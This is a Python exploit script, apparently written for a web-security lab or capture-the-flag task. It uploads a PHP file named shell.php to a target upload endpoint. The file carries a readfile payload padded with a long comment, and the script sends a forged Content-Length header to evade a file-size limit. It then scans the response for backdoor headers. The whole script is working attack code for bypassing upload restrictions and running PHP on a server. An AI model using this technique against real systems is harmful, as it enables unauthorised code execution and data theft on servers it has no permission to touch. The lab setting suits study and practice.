#!/usr/bin/env python3
import requests
import sys

def create_padded_payload(padding_size=5000):
    """Create PHP payload with comment padding"""
    payload = b'<?php readfile("FLAG_4.txt") ?>'
    padding = b'/*' + (b'A' * padding_size) + b'*/'
    return payload + b'\n' + padding

def upload_with_fake_length(url, fake_length=100):
    """Upload file but lie about Content-Length"""
    
    # Create padded payload
    padded = create_padded_payload(5000)
    
    # Save to file
    with open('/tmp/shell.php', 'wb') as f:
        f.write(padded)
    
    print(f"[+] Created payload: {len(padded)} bytes")
    print(f"[+] Will report size as: {fake_length} bytes")
    
    # Prepare multipart form data
    files = {'file': ('shell.php', padded, 'application/x-php')}
    
    # Method 1: Try with custom headers
    headers = {'Content-Length': str(fake_length)}
    
    try:
        response = requests.post(url, files=files, headers=headers)
        print(f"\n[+] Response Status: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body:\n{response.text}")
        
        # Check for backdoor in headers
        for header, value in response.headers.items():
            if header.lower().startswith('x-'):
                print(f"\n[!] Potential Backdoor Header: {header}: {value}")
        
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def create_minimal_payload():
    """Create minimal payload without padding"""
    return b'<?=readfile("FLAG_4.txt")?>'

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 padding_bypass.py <upload_url>")
        print("Example: python3 padding_bypass.py http://vuln.web0x05.hbtn/task4/upload.php")
        sys.exit(1)
    
    url = sys.argv[1]
    
    print("[*] File Size Bypass - Padding Method")
    print(f"[*] Target: {url}\n")
    
    # Try upload with fake content-length
    upload_with_fake_length(url, fake_length=50)
